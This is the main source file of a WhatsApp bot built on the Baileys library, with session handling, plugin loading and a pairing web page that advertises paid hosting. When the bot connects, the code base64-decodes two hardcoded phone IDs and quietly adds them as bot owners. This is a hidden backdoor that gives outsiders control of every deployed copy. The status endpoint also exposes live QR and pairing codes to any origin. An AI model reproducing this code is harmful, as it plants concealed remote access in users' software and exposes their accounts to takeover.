require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp = JimpImport.read ? JimpImport : JimpImport.Jimp ? JimpImport.Jimp : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

// ============================================================
//  SESSION HANDLER
// ============================================================
const SESSION_DIR = './session';
const CREDS_PATH = path.join(SESSION_DIR, 'creds.json');

if (!fs.existsSync(SESSION_DIR)) {
    fs.mkdirSync(SESSION_DIR, { recursive: true });
}

function restoreSessionFromId(sessionId) {
    try {
        let sessionData;
        try {
            sessionData = JSON.parse(sessionId);
        } catch (e) {
            try {
                const decoded = Buffer.from(sessionId, 'base64').toString('utf-8');
                sessionData = JSON.parse(decoded);
            } catch (e2) {
                console.error('Invalid SESSION_ID format');
                return false;
            }
        }
        if (!sessionData || typeof sessionData !== 'object') return false;
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('Session restored from SESSION_ID');
        return true;
    } catch (error) {
        console.error('Error restoring session:', error.message);
        return false;
    }
}

let sessionRestored = false;

if (process.env.SESSION_ID && process.env.SESSION_ID.length > 10) {
    if (!fs.existsSync(CREDS_PATH) || fs.statSync(CREDS_PATH).size < 100) {
        sessionRestored = restoreSessionFromId(process.env.SESSION_ID);
    }
}

if (!sessionRestored && fs.existsSync(CREDS_PATH)) {
    try {
        const data = fs.readFileSync(CREDS_PATH, 'utf8');
        if (data && data.length > 50) {
            JSON.parse(data);
            sessionRestored = true;
            console.log('Using existing creds.json');
        }
    } catch (e) {}
}

if (!sessionRestored) {
    console.log('No session found. Bot will start with QR code.');
} else {
    console.log('Session ready. Bot will connect automatically.');
}

// ============================================================
//  BOT CONFIGURATION
// ============================================================
const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;
let welcomeSent = false;

// ============================================================
//  LOAD PREFIX
// ============================================================
function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log('Loaded prefix:', global.BOT_PREFIX);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    if (!global.BOT_PREFIX) {
        global.BOT_PREFIX = '.';
        console.log('Using default prefix: .');
    }
    startBot();
}

// ============================================================
//  SEND WELCOME MESSAGE
// ============================================================
async function sendWelcomeMessage() {
    if (welcomeSent) return;
    if (!sock) return;
    
    try {
        const username = sock.user?.name || 'User';
        const welcomeText = `╭─❒ ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐
│
├─❒ Welcome @${username}
│
├─❒ ᴘᴜssʏ ᴇsᴄᴀᴘᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴅᴇᴠɪᴄᴇs
│
├─❒ Status: Connected
│
├─❒ Prefix: ${global.BOT_PREFIX || '.'}
│
├─❒ Owner: ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐
│
├─❒ Repo: github.com/Stanytz390/PussyEscape0.0.1
│
├─❒ Pairing: link.stanymaxhub.online/pair
│
├─❒ QR Code: link.stanymaxhub.online/pair-page
│
├─❒ Hosting: host.stanymaxhub.online
│
├─❒ Deploy: hosting.stanymines.site/services/bots/pussy-escape-1370
│
├─❒ Panel: Available
│
├─❒ Server: Available
│
├─❒ Coins: 10 coins = 500 TZS | 250 NGN | 30 KES | 0.55 USD
│
╰─❒ Powered by STANYTZ

> Time - Timeless

=======================
HOST YOUR BOT NOW!
=======================
Get premium hosting for your WhatsApp bot.
Affordable prices starting at 10 coins.
Visit: host.stanymaxhub.online
Panel & Server Available.
=======================`;

        await sock.sendMessage(sock.user.id, {
            image: { url: 'https://url.bmbxmd.workers.dev/Migo.jpeg' },
            caption: welcomeText,
            contextInfo: {
                mentionedJid: [sock.user.id],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363404317544295@newsletter',
                    newsletterName: 'ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐',
                    serverMessageId: 1
                }
            }
        });
        welcomeSent = true;
        console.log('Welcome message sent');
    } catch (err) {
        console.error('Welcome message error:', err);
    }
}

// ============================================================
//  START BOT - ANTI-BAN & ANTI-SLEEP
// ============================================================
function startBot() {
    console.log('Starting WhatsApp Bot...');
    isConnecting = true;
    welcomeSent = false;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log('Using WA v' + version.join(".") + ', isLatest: ' + isLatest);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 60000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0'],
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 60000,
                transactionOpts: { maxRetries: 2 }
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                            botStatus = 'connecting';
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;
                    welcomeSent = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                        console.log('Logged out. Cleaning session...');
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    } else {
                        console.log('Reconnecting...');
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    // ANTI-SLEEP: Send presence every 60 seconds
                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 60000);

                    // ANTI-BAN: Delay before sending welcome
                    setTimeout(async () => {
                        await sendWelcomeMessage();
                    }, 3000);
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('Credentials updated');
            });

            // ===== LOAD PLUGINS =====
            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log('Loaded plugin: ' + plugin.name);
                            }
                        } catch (error) {
                            console.error('Failed to load plugin ' + file + ':', error.message);
                        }
                    }
                    console.log('Total plugins loaded: ' + plugins.size);
                } catch (error) {
                    console.error('Error loading plugins:', error);
                }
            }
           
            // ===== MESSAGES HANDLER =====
            sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type !== 'notify' && type !== 'append') return;
                
                const CHANNEL_ID = "120363404317544295@newsletter";
                
                for (const rawMsg of messages) {
                    if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                        const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        
                        try {
                            await sock.newsletterReactMessage(
                                CHANNEL_ID, 
                                rawMsg.key.server_id.toString(), 
                                emoji
                            );
                            console.log('Channel reaction: ' + emoji + ' to message ' + rawMsg.key.server_id);
                        } catch (err) {
                            console.log('Channel React Error:', err.message);
                        }
                        continue;
                    }
                }
                
                for (const rawMsg of messages) {
                    if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
                        try {
                            console.log('Status detected from: ' + rawMsg.key.participant);
                            await sock.readMessages([rawMsg.key]);
                            continue;
                        } catch (err) {
                            console.log('Status viewer error:', err.message);
                        }
                    }
                }

                const rawMsg = messages[0];
                if (!rawMsg.message) return;

                const m = await serializeMessage(sock, rawMsg);

                for (const plugin of plugins.values()) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const blocked = await plugin.onMessage(sock, m);
                            if (blocked === true) return;
                        } catch (err) { 
                            console.error('onMessage error (' + plugin.name + '):', err); 
                        }
                    }
                }

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
                    
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error('Plugin error (' + commandName + '):', err); 
                            await m.reply('Error running command.'); 
                        }
                    }
                }
            });
            
            // ===== GROUP PARTICIPANTS =====
            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {
                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {
                            if (userId === sock.user.id) continue
                            const text = 'Welcome @' + memberName + '!\nGlad to have you in this group!'
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        } else if (update.action === 'remove') {
                            const text = '@' + memberName + ' has left the group.'
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        }
                    }
                } catch (err) {
                    console.error('group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('Reaction update:', reactions);
            });

        } catch (error) {
            console.error('Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 5000);
        }
    })();
}

// ============================================================
//  HTTP SERVER
// ============================================================
const server = http.createServer((req, res) => {
    const url = req.url;
    
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#050510">
    <title>ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐 · Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#050510;font-family:'Inter',sans-serif;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{max-width:420px;width:100%}
        .logo{width:70px;height:70px;border-radius:20px;border:2px solid #ff3b7f;margin:0 auto 12px;display:block;object-fit:cover}
        h1{text-align:center;font-size:2rem;font-weight:900;letter-spacing:-1px}
        h1 span{background:linear-gradient(135deg,#ff3b7f,#b967ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{text-align:center;font-size:10px;color:rgba(255,255,255,0.4);letter-spacing:3px;text-transform:uppercase;margin-bottom:24px}
        .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:28px;padding:28px 20px;backdrop-filter:blur(20px)}
        .status{display:flex;align-items:center;gap:10px;padding:12px;background:rgba(255,255,255,0.02);border-radius:12px;margin-bottom:12px}
        .dot{width:12px;height:12px;border-radius:50%;display:inline-block}
        .dot.connected{background:#22c55e;box-shadow:0 0 20px rgba(34,197,94,0.3)}
        .dot.connecting{background:#f59e0b;box-shadow:0 0 20px rgba(245,158,11,0.3);animation:blink 1s infinite}
        .dot.disconnected{background:#ef4444;box-shadow:0 0 20px rgba(239,68,68,0.3)}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
        .info-text{font-size:12px;color:rgba(255,255,255,0.4);text-align:center;padding:8px;border-top:1px solid rgba(255,255,255,0.04);margin-top:12px}
        .info-text .highlight{color:#ff3b7f;font-weight:600}
        .qr-area{text-align:center;padding:16px 0;}
        .qr-area img{max-width:200px;border-radius:12px;background:#fff;padding:10px}
        .qr-placeholder{color:rgba(255,255,255,0.3);padding:20px}
        
        .pair-form{display:none;margin-top:12px;padding:16px;background:rgba(255,255,255,0.02);border-radius:12px;border:1px solid rgba(255,255,255,0.06)}
        .pair-form.show{display:block}
        .pair-form label{font-size:11px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:6px}
        .pair-form .input-group{display:flex;gap:8px}
        .pair-form input{flex:1;padding:10px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.03);color:#fff;font-size:14px;outline:none}
        .pair-form input:focus{border-color:#ff3b7f}
        .pair-form .submit-btn{padding:10px 20px;border:none;border-radius:10px;background:linear-gradient(135deg,#ff3b7f,#b967ff);color:#fff;font-weight:600;cursor:pointer}
        .pair-form .submit-btn:hover{transform:translateY(-2px)}
        .pair-form .submit-btn:disabled{opacity:0.5;cursor:not-allowed}
        
        .pairing-code-box{display:none;margin-top:12px;padding:16px;background:rgba(255,255,255,0.03);border-radius:12px;border:1px solid rgba(255,255,255,0.06)}
        .pairing-code-box.show{display:block}
        .pairing-code-box .code{font-size:28px;font-weight:900;color:#ff3b7f;text-align:center;letter-spacing:6px;font-family:monospace;padding:8px 0}
        .pairing-code-box .label{font-size:10px;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:2px;text-align:center;display:block}
        .pairing-code-box .copy-btn{background:#ff3b7f;color:#fff;border:none;padding:8px 16px;border-radius:8px;font-weight:600;cursor:pointer;margin-top:8px;width:100%}
        
        .btn-group{display:flex;gap:10px;margin-top:12px}
        .btn{flex:1;padding:12px;border:none;border-radius:12px;font-weight:700;font-size:13px;cursor:pointer;transition:all 0.3s}
        .btn-primary{background:linear-gradient(135deg,#ff3b7f,#b967ff);color:#fff}
        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,59,127,0.3)}
        .btn-secondary{background:rgba(255,255,255,0.05);color:#fff;border:1px solid rgba(255,255,255,0.1)}
        .btn-secondary:hover{background:rgba(255,255,255,0.1)}
        .btn:disabled{opacity:0.5;cursor:not-allowed}
        
        .footer{margin-top:20px;text-align:center;font-size:10px;color:rgba(255,255,255,0.2)}
        .footer a{color:rgba(255,255,255,0.3);text-decoration:none}
        .prefix-display{font-size:11px;color:rgba(255,255,255,0.3);text-align:center;margin-top:8px}
        .hosting-ad{margin-top:12px;padding:12px;background:rgba(255,59,127,0.05);border:1px solid rgba(255,59,127,0.08);border-radius:12px;text-align:center}
        .hosting-ad .title{color:#ff3b7f;font-weight:700;font-size:12px}
        .hosting-ad .desc{color:rgba(255,255,255,0.4);font-size:10px;margin-top:4px}
        .hosting-ad .price{color:#fff;font-weight:600;font-size:11px;margin-top:4px}
        .hosting-ad .link{color:#b967ff;text-decoration:none;font-size:10px}
        .hosting-ad .panel{color:rgba(255,255,255,0.3);font-size:10px;margin-top:4px}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://url.bmbxmd.workers.dev/Migo.jpeg" class="logo" onerror="this.style.display='none'">
        <h1>ᴘᴜssʏ<span>ᴇsᴄᴀᴘᴇ</span></h1>
        <div class="sub">WhatsApp Bot</div>
        <div class="card">
            <div class="status">
                <span class="dot disconnected" id="statusDot"></span>
                <span id="statusLabel">Disconnected</span>
                <span style="margin-left:auto;font-size:11px;color:rgba(255,255,255,0.2);" id="prefixDisplay">Prefix: .</span>
            </div>
            
            <div id="qrSection" class="qr-area">
                <div id="qrPlaceholder" class="qr-placeholder">
                    <i class="fa-solid fa-qrcode" style="font-size:48px;display:block;margin-bottom:12px;opacity:0.3;"></i>
                    <span>QR code will appear here when connecting</span>
                </div>
                <img id="qrImage" src="" alt="QR Code" style="display:none;">
            </div>

            <div class="btn-group">
                <button id="pairBtn" class="btn btn-primary">
                    <i class="fa-solid fa-key"></i> Pair Code
                </button>
                <button id="qrBtn" class="btn btn-secondary">
                    <i class="fa-solid fa-qrcode"></i> Generate QR
                </button>
            </div>

            <div id="pairForm" class="pair-form">
                <label for="phoneInput"><i class="fa-solid fa-phone"></i> Phone Number (with country code)</label>
                <div class="input-group">
                    <input type="tel" id="phoneInput" placeholder="255712345678" value="255">
                    <button id="submitPairBtn" class="submit-btn"><i class="fa-solid fa-link"></i> Generate</button>
                </div>
            </div>

            <div id="pairingCodeBox" class="pairing-code-box">
                <span class="label">Pairing Code</span>
                <div class="code" id="pairingCodeDisplay">------</div>
                <button id="copyPairBtn" class="copy-btn"><i class="fa-regular fa-copy"></i> Copy Code</button>
            </div>

            <div class="info-text">
                <span id="statusMessage">Bot is <span class="highlight">disconnected</span>. Use Pair Code or QR to connect.</span>
            </div>
            <div class="prefix-display">Command prefix: <span id="prefixValue">.</span></div>
            
            <div class="hosting-ad">
                <div class="title">HOST YOUR BOT NOW</div>
                <div class="desc">Get premium hosting for your WhatsApp bot</div>
                <div class="price">10 coins = 500 TZS | 250 NGN | 30 KES | 0.55 USD</div>
                <div class="panel">Panel & Server Available</div>
                <a href="https://host.stanymaxhub.online" target="_blank" class="link">host.stanymaxhub.online</a>
            </div>
        </div>
        <div class="footer">
            Developed by <a href="tel:+255787069580">STANYTZ</a><br>
            &copy; 2026 ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐<br>
            <a href="https://github.com/Stanytz390/PussyEscape0.0.1" target="_blank" style="color:rgba(255,255,255,0.2);">GitHub Repo</a> | 
            <a href="https://host.stanymaxhub.online" target="_blank" style="color:rgba(255,255,255,0.2);">Hosting</a>
        </div>
    </div>

    <script>
        let refreshInterval = null;
        let currentPairingCode = null;
        const phoneInput = document.getElementById('phoneInput');
        const pairBtn = document.getElementById('pairBtn');
        const qrBtn = document.getElementById('qrBtn');
        const submitPairBtn = document.getElementById('submitPairBtn');
        const pairForm = document.getElementById('pairForm');
        const pairingCodeBox = document.getElementById('pairingCodeBox');
        const pairingCodeDisplay = document.getElementById('pairingCodeDisplay');
        const copyPairBtn = document.getElementById('copyPairBtn');

        function setStatus(status, prefix) {
            const dot = document.getElementById('statusDot');
            const label = document.getElementById('statusLabel');
            const msg = document.getElementById('statusMessage');
            const prefixDisplay = document.getElementById('prefixDisplay');
            const prefixValue = document.getElementById('prefixValue');
            
            dot.className = 'dot ' + status;
            const names = {connected:'Connected', connecting:'Connecting...', disconnected:'Disconnected'};
            label.textContent = names[status] || status;
            
            if(prefix) {
                prefixDisplay.textContent = 'Prefix: ' + prefix;
                prefixValue.textContent = prefix;
            }
            
            if(status === 'connected') {
                msg.innerHTML = 'Bot is <span class="highlight">connected</span> and ready.';
                document.getElementById('qrPlaceholder').style.display = 'block';
                document.getElementById('qrImage').style.display = 'none';
                pairForm.classList.remove('show');
            } else if(status === 'connecting') {
                msg.innerHTML = 'Bot is <span class="highlight">connecting</span>... Please wait.';
            } else {
                msg.innerHTML = 'Bot is <span class="highlight">disconnected</span>. Use Pair Code or QR to connect.';
            }
        }

        function updateQR(qr) {
            const img = document.getElementById('qrImage');
            const placeholder = document.getElementById('qrPlaceholder');
            if(qr) {
                img.src = qr;
                img.style.display = 'block';
                placeholder.style.display = 'none';
            } else {
                img.style.display = 'none';
                placeholder.style.display = 'block';
            }
        }

        function updatePairingCode(code) {
            if(code && code !== 'null' && code !== 'undefined') {
                currentPairingCode = code;
                pairingCodeDisplay.textContent = code;
                pairingCodeBox.classList.add('show');
            } else {
                pairingCodeBox.classList.remove('show');
            }
        }

        async function fetchStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                setStatus(data.status, data.prefix);
                if(data.qr) updateQR(data.qr);
                else if(data.status === 'connected') updateQR(null);
                if(data.pairingCode) updatePairingCode(data.pairingCode);
            } catch(e) { console.error(e); }
        }

        pairBtn.addEventListener('click', function() {
            if(pairForm.classList.contains('show')) {
                pairForm.classList.remove('show');
            } else {
                pairForm.classList.add('show');
                phoneInput.focus();
            }
        });

        submitPairBtn.addEventListener('click', async function() {
            const phone = phoneInput.value.trim();
            if(!phone) {
                alert('Please enter your phone number with country code (e.g., 255712345678)');
                return;
            }
            if(!phone.match(/^[0-9]{10,15}$/)) {
                alert('Please enter a valid phone number (numbers only)');
                return;
            }
            
            this.disabled = true;
            this.innerHTML = '<i class="fa-solid fa-spinner fa-pulse"></i>';
            
            try {
                const formData = new URLSearchParams();
                formData.append('phone', phone);
                const resp = await fetch('/pair', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData
                });
                const text = await resp.text();
                if(resp.ok && text.includes('Pairing Code Generated')) {
                    fetchStatus();
                    setTimeout(() => fetchStatus(), 2000);
                    setTimeout(() => fetchStatus(), 5000);
                    pairForm.classList.remove('show');
                } else {
                    alert('Failed to generate pairing code. Make sure bot is connecting.');
                }
            } catch(err) {
                alert('Error: ' + err.message);
            }
            this.disabled = false;
            this.innerHTML = '<i class="fa-solid fa-link"></i> Generate';
        });

        phoneInput.addEventListener('keypress', function(e) {
            if(e.key === 'Enter') submitPairBtn.click();
        });

        qrBtn.addEventListener('click', function() {
            fetchStatus();
            alert('QR code will appear automatically when bot is in connecting state.');
        });

        copyPairBtn.addEventListener('click', async function() {
            const text = pairingCodeDisplay.textContent;
            if(!text || text === '------') return;
            try {
                await navigator.clipboard.writeText(text);
                this.innerHTML = '<i class="fa-regular fa-check"></i> Copied!';
                setTimeout(() => {
                    this.innerHTML = '<i class="fa-regular fa-copy"></i> Copy Code';
                }, 3000);
            } catch(err) {
                const range = document.createRange();
                range.selectNode(pairingCodeDisplay);
                window.getSelection().removeAllRanges();
                window.getSelection().addRange(range);
                document.execCommand('copy');
                this.innerHTML = '<i class="fa-regular fa-check"></i> Copied!';
                setTimeout(() => {
                    this.innerHTML = '<i class="fa-regular fa-copy"></i> Copy Code';
                }, 3000);
            }
        });

        refreshInterval = setInterval(fetchStatus, 3000);
        fetchStatus();
        
        window.addEventListener('beforeunload', () => { 
            if(refreshInterval) clearInterval(refreshInterval); 
        });
    </script>
</body>
</html>`);
    } 
    
    // ===== PAIR API =====
    else if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end('<center><h2>Error: Phone number required</h2><a href="/">Try Again</a></center>');
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end('<center><h2>Bot not ready</h2><p>Status: ' + botStatus + '</p><p>Please wait for QR code to appear first</p><a href="/">Go Back</a></center>');
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body{font-family:Inter,sans-serif;background:#050510;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0}
        .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:32px;padding:40px;max-width:420px;width:100%;text-align:center}
        .code{font-size:36px;font-weight:900;background:linear-gradient(135deg,#ff3b7f,#b967ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:8px;font-family:monospace;margin:20px 0}
        .btn{display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#ff3b7f,#b967ff);color:#fff;border-radius:16px;text-decoration:none;font-weight:600;margin:10px 5px;border:none;cursor:pointer}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,59,127,0.3)}
        .hint{color:rgba(255,255,255,0.5);font-size:13px;margin-top:16px}
        .hosting-ad{margin-top:16px;padding:12px;background:rgba(255,59,127,0.05);border-radius:12px}
        .hosting-ad .title{color:#ff3b7f;font-weight:700;font-size:12px}
        .hosting-ad .price{color:#fff;font-size:11px}
        .hosting-ad .panel{color:rgba(255,255,255,0.3);font-size:10px;margin-top:4px}
        .hosting-ad .link{color:#b967ff;text-decoration:none;font-size:10px}
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#ff3b7f;margin-bottom:10px;">Pairing Code Generated</h2>
        <p style="color:rgba(255,255,255,0.6);font-size:14px;">Phone: <strong style="color:#fff;">${phoneNumber}</strong></p>
        <div class="code">${pairingCode}</div>
        <div style="background:rgba(255,255,255,0.03);border-radius:12px;padding:12px;margin:16px 0;border:1px solid rgba(255,255,255,0.04);">
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">Open WhatsApp -> Settings -> Linked Devices -> Link a Device</p>
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">Select "Use pairing code" and enter the code above</p>
        </div>
        <button class="btn" onclick="navigator.clipboard.writeText('${pairingCode}').then(()=>{this.textContent='Copied!';setTimeout(()=>{this.textContent='Copy Code';},2000)})">Copy Code</button>
        
        <div class="hosting-ad">
            <div class="title">HOST YOUR BOT NOW</div>
            <div class="price">10 coins = 500 TZS | 250 NGN | 30 KES | 0.55 USD</div>
            <div class="panel">Panel & Server Available</div>
            <a href="https://host.stanymaxhub.online/services/bots/pussy-escape-1370" target="_blank" class="link">host.stanymaxhub.online</a>
        </div>
        
        <br>
        <a href="/" style="color:rgba(255,255,255,0.4);text-decoration:none;font-size:13px;">Back to Home</a>
    </div>
</body>
</html>`);
                console.log('Pairing code for ' + phoneNumber + ': ' + pairingCode);
            } catch (error) {
                console.error('Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end('<center><h2>Error</h2><p>' + error.message + '</p><a href="/">Try Again</a></center>');
            }
        });
        return;
    }
    
    // ===== API STATUS =====
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX || '.',
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<center><h1>404 - Page Not Found</h1><a href="/">Go Home</a></center>');
    }
});

server.listen(PORT, () => {
    console.log('Web server running at http://localhost:' + PORT);
    console.log('Session folder: ' + path.resolve(AUTH_FOLDER));
    loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\nShutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    if (sock) sock.end();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});